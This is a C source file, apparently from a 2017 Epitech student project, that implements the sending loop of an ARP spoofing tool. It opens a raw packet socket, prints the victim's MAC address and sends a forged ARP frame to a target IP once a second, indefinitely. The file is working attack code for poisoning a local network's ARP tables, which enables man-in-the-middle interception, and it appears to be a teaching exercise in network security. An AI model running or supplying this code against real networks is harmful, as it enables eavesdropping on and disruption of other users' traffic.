/*
** EPITECH PROJECT, 2017
** spoof.c
** File description:
** spoof action
*/

#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include "../include/arpvariables.h"
#include "../include/arp.h"
int send_arp_spoof(int sd, struct arp_options *arp)
{
    if (sendto(sd, arp->eth_frame, arp->frame_length, 0,
    (struct sockaddr *) &arp->device_info,
    sizeof(arp->device_info)) < 1) {
        printf("Send fail...");
        return(ERROR);
    }
    return (SUCCESS);
} 

int start_spoofing(struct arp_options *arp)
{
    printf("Found victim’s MAC address: '");
    for (int i = 0; i < 5; i++) {
        printf("%02X:", arp->victim.dest_mac[i]);
    }
    printf("%02X'\n", arp->victim.dest_mac[5]);
    int sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sd < 0) {
        printf("Socket error...");
        return (ERROR);
    }
    while (1) {
        if (send_arp_spoof(sd,arp) == ERROR)
            return (ERROR);
        printf("Spoofed packet sent to '%s'\n", arp->dest_ip);
        sleep(1);
    }
    close(sd);
    return (SUCCESS);
}
